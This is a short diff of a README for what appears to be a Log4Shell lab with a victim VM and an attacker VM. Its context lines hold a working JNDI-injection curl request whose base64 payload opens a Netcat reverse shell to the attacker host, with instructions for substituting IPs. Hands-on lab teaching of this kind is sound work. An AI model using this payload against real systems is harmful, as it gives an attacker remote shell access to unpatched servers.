@@ -62,7 +62,7 @@ Of course use your command replacing mine.
 `curl 192.168.0.5:8080 -H 'X-Api-Version:${jndi:ldap://192.168.0.4:1389/Basic/Command/Base64/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMC40IDEyMzQgPi90bXAvZgo=}’`<br>
 Replace `192.168.0.5` with your victim VM's IP, `192.168.0.4` with your attacker VM's IP and `cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMC40IDEyMzQgPi90bXAvZgo=` with your remote shell command base64 encoded.
 
-Now you should see the vulnerability letting you as attacker run the command you injected in the request header and the remote shell ready where you set Netcat listen.<br>
+Now you should see the vulnerability letting you as attacker run the command you injected in the request header and the remote shell ready where you set Netcat listen.<br><br>
 <img src="https://github.com/Fantantonio/Log4ShellVictim/blob/master/readme_images/Victim_VM.png"> <img src="https://github.com/Fantantonio/Log4ShellVictim/blob/master/readme_images/Attacker_VM.png">
 
 ### A step further
